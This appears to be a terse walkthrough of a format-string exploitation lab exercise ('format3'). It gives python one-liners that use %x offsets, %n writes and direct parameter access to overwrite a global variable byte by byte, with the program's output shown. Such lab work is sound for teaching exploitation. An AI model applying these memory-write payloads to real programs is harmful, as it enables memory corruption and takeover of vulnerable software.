Now we need to write 4 bytes instead of one byte.

objdump -t format3 | grep target
080496f4 g     O .bss	00000004              target

Determine offset:

$ python -c "print 'AAAA' + '%x.'*11 + '%x'" | ./format3
AAAA0.bffff5c0.b7fd7ff4.0.0.bffff7c8.804849d.bffff5c0.200.b7fd8420.bffff604.41414141
target is 00000000 :(


Set byte to 0x44:

$ python -c "print '\xf4\x96\x04\x08' + '%x'*10 + '%11x' + '%n'" | ./format3
0bffff5c0b7fd7ff400bffff7c8804849dbffff5c0200b7fd8420   bffff604


Now just set all bytes to specific values rotating byte with '%<number>u'

$ python -c "print '\xf4\x96\x04\x08CRAP\xf5\x96\x04\x08CRAP\xf6\x96\x04\x08CRAP\xf7\x96\x04\x08' + '%x.'*10 + '%233u%n' + '%17u%n' + '%173u%n' + '%255u%n'" | ./format3
CRAPCRAPCRAP0.bffff5c0.b7fd7ff4.0.0.bffff7c8.804849d.bffff5c0.200.b7fd8420.                                                                                                                                                                                                                               3221222916       1346458179                                                                                                                                                                   1346458179                                                                                                                                                                                                                                                     1346458179
you have modified the target :)




Or using Direct Parameter Access:

$ python -c "print '\xf4\x96\x04\x08' + '\xf5\x96\x04\x08' + '\xf6\x96\x04\x08' + '\xf7\x96\x04\x08' + '%52x%12\$n' + '%17x%13\$n' + '%173x%14\$n'" | ./format3
                                                   0         bffff5c0                                                                                                                                                                     b7fd7ff4
you have modified the target :)
